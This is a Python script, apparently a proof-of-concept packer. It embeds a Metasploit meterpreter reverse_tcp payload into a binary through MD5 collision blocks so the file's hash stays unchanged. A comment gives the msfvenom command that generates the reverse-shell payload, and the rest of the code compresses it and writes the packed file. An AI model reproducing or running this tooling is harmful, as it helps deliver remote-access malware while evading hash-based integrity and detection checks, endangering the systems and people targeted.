from collisions import swap_fccoll
import hashlib
import zlib

def set_bit(data, offset, value, hashobj=None):
	if (data[offset + 0x13] >> 7) ^ value:
		assert((offset % 64) == 0)
		swap_fccoll(data, offset, hashobj)

def compress_raw(data):
	c = zlib.compressobj(level=9, wbits=-15)
	return c.compress(data) + c.flush(zlib.Z_FINISH)

monomorph = bytearray(open("bin/monomorph", "rb").read())
orig_hash = hashlib.md5(monomorph).digest()

# msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f raw -o meterpreter.bin
payload = open("meterpreter.bin", "rb").read() + b"hello"
compressed_payload = compress_raw(payload)

idx = monomorph.index((0xdeadbeef).to_bytes(4, "little"))
max_payload_len = int.from_bytes(monomorph[idx+4:idx+4+4], "little")

print("raw payload size:", len(payload))
print("compressed payload size:", len(compressed_payload))
print("max payloax size:", max_payload_len)
assert(len(compressed_payload) <= max_payload_len)

idx += 128 # skip header

set_bit(monomorph, idx, 1) # activate
idx += 128

buffer = len(payload).to_bytes(4, "little") + compressed_payload + bytes(max_payload_len - len(compressed_payload))

hashobj = hashlib.md5()
hashobj.update(monomorph[:idx])
for byte in buffer:
	for bit in range(8):
		set_bit(monomorph, idx, (byte >> bit) & 1, hashobj)
		hashobj.update(monomorph[idx:idx+128])
		idx += 128

#assert(orig_hash == hashlib.md5(monomorph).digest())

with open("bin/monomorph.packed", "wb") as out:
	out.write(monomorph)
